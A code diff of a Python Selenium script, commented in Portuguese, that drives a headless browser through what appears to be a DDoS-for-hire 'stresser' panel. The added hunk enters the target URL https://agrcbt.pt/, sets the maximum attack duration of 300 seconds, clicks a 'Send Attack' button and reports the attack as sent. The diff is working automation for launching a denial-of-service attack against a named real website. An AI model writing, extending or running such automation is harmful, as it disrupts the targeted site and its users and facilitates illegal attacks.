@@ -5,7 +5,7 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.common.action_chains import ActionChains  # Importando ActionChains
+from selenium.webdriver.common.action_chains import ActionChains
 
 # Configurando as opções do Chrome para executar em modo headless e definindo o User Agent
 chrome_options = Options()
@@ -80,6 +80,33 @@ try:
     # Verificando se o título da página contém "Panel"
     if "Panel" in driver.title:
         print("Página de Painel acessada com sucesso.")
+        
+        # Aguardando 5 segundos antes de preencher o campo de URL do alvo
+        time.sleep(5)
+        
+        # Preenchendo o campo de URL do alvo
+        target_url_field = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="targetUrl"]'))
+        )
+        target_url_field.clear()
+        target_url_field.send_keys("https://agrcbt.pt/")
+        
+        # Esperando 3 segundos antes de preencher o campo de tempo
+        time.sleep(3)
+        
+        # Preenchendo o campo de tempo
+        time_field = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Min: 15, Max: 300 sec"]')
+        time_field.clear()
+        time_field.send_keys("300")
+        
+        # Esperando 3 segundos antes de clicar no botão de envio
+        time.sleep(3)
+        
+        # Clicando no botão de envio
+        send_button = driver.find_element(By.XPATH, '//button[contains(@class, "btn-primary")][contains(text(), "Send Attack")]')
+        send_button.click()
+        print("Ataque enviado com sucesso.")
+        
     else:
         print("Falha ao acessar a página de Painel.")
     
